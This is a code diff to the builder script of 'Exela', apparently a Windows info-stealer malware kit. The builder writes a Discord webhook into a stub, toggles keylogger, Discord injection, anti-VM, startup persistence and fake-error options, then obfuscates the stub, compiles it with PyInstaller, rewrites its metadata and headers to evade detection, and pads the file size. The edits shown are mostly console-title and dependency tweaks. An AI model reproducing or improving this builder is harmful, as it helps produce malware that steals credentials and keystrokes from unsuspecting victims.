@@ -35,6 +35,9 @@ class SubModules:
             del data # remove variable from memory
     @staticmethod
     def RemoveMetaData(file_path:str) -> None:
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Removigin Metadata") 
+        except:pass
         with open(file_path, "rb") as file:
             data = file.read()
         data = data.replace(b"PyInstaller:", b"PyInstallem:")
@@ -52,6 +55,9 @@ class SubModules:
     @staticmethod
     def PumpFile(filePath:str, pump_size:int) -> None: # adding empty byte to file
         try:
+            try:
+                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Pumping Stub") 
+            except:pass
             if os.path.exists(filePath):
                 additional_size_bytes = pump_size * 1024 * 1024
 
@@ -105,13 +111,9 @@ class Builder:
         try:
             os.system('cls')
             os.system('pip install pynput')
-            os.system("pip install colorama")
             os.system("pip install cryptography")
             os.system("pip install psutil")
-            os.system("pip install GPUtil")
             os.system("pip install wmi")
-            os.system("pip install pycryptodome")
-            os.system("pip install pypiwin32")
             os.system("pip install dhooks")
             os.system("pip install requests")
             os.system("pip install pyinstaller")
@@ -132,11 +134,12 @@ class Builder:
         self.GetFakeError()
         time.sleep(0.5)
     def MakeExe(self) -> None:
+        
+        self.WriteSettings()
+        SubModules().ObfuscateFile("stub.py")
         try:
             ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Building ...") 
         except:pass
-        self.WriteSettings()
-        SubModules().ObfuscateFile("stub.py")
         pyinstaller_code = f'{self.PyInstallerCommand} --icon={self.IconPath} stub.py'
         os.system(pyinstaller_code)
         SubModules().ChangeExeHeaders(os.path.join("dist", "stub.exe")) 
@@ -151,14 +154,11 @@ class Builder:
         with open("Exela.py", "r",encoding="utf-8", errors="ignore") as file:
             data = file.read()
         
-        replaced_data = data.replace("%REPLACE_ME_FOR_QUICADXD%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                
+        replaced_data = data.replace("%WEBHOOK_URL%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                
 
         with open("stub.py", "w", encoding="utf-8", errors="ignore") as file:
             file.write(replaced_data)
     def GetPump(self) -> None:
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Pumping Stub") 
-        except:pass
         get_req = str(input("Do u want pump the file : "))
         if get_req.lower() == "y" or get_req.lower() == "yes":
             try:
@@ -229,7 +229,6 @@ class Builder:
         fakeError = str(input("Do u want to use Fake Error : "))
         if fakeError.lower() == "y" or fakeError.lower() == "yes":
             self.UseFakerError = True
-        
 
 if __name__ == '__main__':
     
@@ -245,11 +244,13 @@ if __name__ == '__main__':
                 Builder().MakeExe()
             except Exception as error:
                 ctypes.windll.user32.MessageBoxW(0, f"An error occurred while Building your file\n\nError : {str(error)}", "Error",  0x10)
+                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File cannot Compiled!") 
             else:
                 ctypes.windll.user32.MessageBoxW(0, "Your File compiled succesfully, now u can close the window", "Information",  0x40)
+                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File Compiled!") 
                 while True:
                     continue
-
+                
         else:
             ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls use 3.10.0 or 3.11.0", "Error",  0x10)
     else:
